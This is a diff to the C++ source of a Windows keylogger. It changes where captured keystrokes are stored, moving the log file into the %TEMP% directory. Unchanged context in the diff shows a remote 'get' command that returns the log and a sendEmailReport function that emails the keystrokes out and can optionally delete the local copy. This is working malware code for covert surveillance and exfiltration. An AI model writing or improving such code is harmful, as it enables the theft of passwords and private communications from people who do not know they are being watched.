@@ -22,12 +22,12 @@ Keylogger::Keylogger() {
 	});
 	CommandParser::addCommand(L"get", [this](std::wstring argStr) {
 		logFile.close();
-		std::ifstream logData;
-		logData.open(this->FILENAME, std::ios::in);
-		std::wstring data((std::istreambuf_iterator<char>(logData)),
-			std::istreambuf_iterator<char>());
+		std::wifstream logData;
+		logData.open(this->logfilePath, std::ios::in);
+		std::wstring data((std::istreambuf_iterator<wchar_t>(logData)),
+			std::istreambuf_iterator<wchar_t>());
 		logData.close();
-		logFile.open(this->FILENAME, std::ios::app);
+		logFile.open(this->logfilePath, std::ios::app);
 		return data;
 	});
 	CommandParser::addCommand(L"block", [this](std::wstring argStr) {
@@ -57,6 +57,10 @@ Keylogger::Keylogger() {
 	hook = make_shared<Hook>();
 }
 
+Keylogger::~Keylogger() {
+	stop();
+}
+
 void Keylogger::start() {
 	if (!this->isActive) {
 		hook->setHook([this](const wchar_t key[]) {
@@ -67,7 +71,13 @@ void Keylogger::start() {
 			= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
 		logFile.imbue(utf8_locale);
 
-		logFile.open(FILENAME, std::ios::app);
+		// Create log file int %TEMP% directory
+		const int buffSize = 1024;
+		wchar_t buff[1024];
+		GetTempPath(buffSize, buff);
+		this->logfilePath = std::wstring(buff) + L"\\" + FILENAME;
+
+		logFile.open(this->logfilePath, std::ios::app);
 		this->isActive = true;
 	}
 }
@@ -128,10 +138,6 @@ void Keylogger::stop() {
 	}
 }
 
-Keylogger::~Keylogger() {
-	stop();
-}
-
 bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	auto emailService = make_shared<EmailService>();
 
@@ -142,7 +148,7 @@ bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	// Create email body
 	logFile.close();
 	std::wifstream logData;
-	logData.open(this->FILENAME, std::ios::in);
+	logData.open(this->logfilePath, std::ios::in);
 	std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
 		std::istreambuf_iterator<wchar_t>());
 	logData.close();
@@ -154,7 +160,7 @@ bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 	}
 
 	auto openMode = deleteLocal ? std::ios::trunc : std::ios::app;
-	logFile.open(this->FILENAME, openMode);
+	logFile.open(this->logfilePath, openMode);
 
 	this->lastActiveWindow = nullptr;
 	return true;
